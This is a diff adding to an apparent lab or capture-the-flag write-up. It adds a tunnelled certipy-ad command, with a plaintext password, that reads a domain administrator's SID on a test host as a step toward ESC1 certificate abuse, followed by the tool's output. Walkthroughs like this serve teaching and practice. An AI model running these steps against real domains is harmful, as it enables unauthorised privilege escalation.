@@ -550,6 +550,26 @@ As seen here is is vulnerable to ESC1 and others as well but since ESC1 is the s
 
 ## ESC1
 ```python
+proxychains certipy-ad account -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip '10.129.234.42' -user '_admin' read       
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
+[*] Reading attributes for '_admin':
+    cn                                  : _admin
+    distinguishedName                   : CN=_admin,CN=Users,DC=shibuya,DC=vl
+    name                                : _admin
+    objectSid                           : S-1-5-21-87560095-894484815-3652015022-500
+    sAMAccountName                      : _admin
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-02-15T07:24:21+00:00
+    whenChanged                         : 2025-05-07T09:26:52+00:00
+```
+I first grabbed the admins SID
+
+```python
 
 ```
 
